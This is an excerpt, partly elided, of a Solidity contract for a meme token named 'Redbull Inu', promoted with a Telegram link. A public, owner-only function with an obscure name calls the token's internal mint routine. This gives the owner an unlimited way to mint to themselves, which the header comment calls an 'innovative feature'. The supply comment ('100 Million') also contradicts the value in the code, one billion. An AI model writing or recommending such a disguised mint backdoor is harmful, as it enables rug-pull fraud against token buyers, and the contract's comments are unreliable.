...
//
// $Redbull Inu proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/RedbullInu
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Redbullinu(uint256 amount) public onlyOwner {
 _Redbullinu(msg.sender, amount);
    }
    ...
    function _Redbullinu(address account, uint256 amount) internal virtual {
...
contract $RedbullInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Redbul Inu", "REDBULL INU") {
        _Redbullinu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}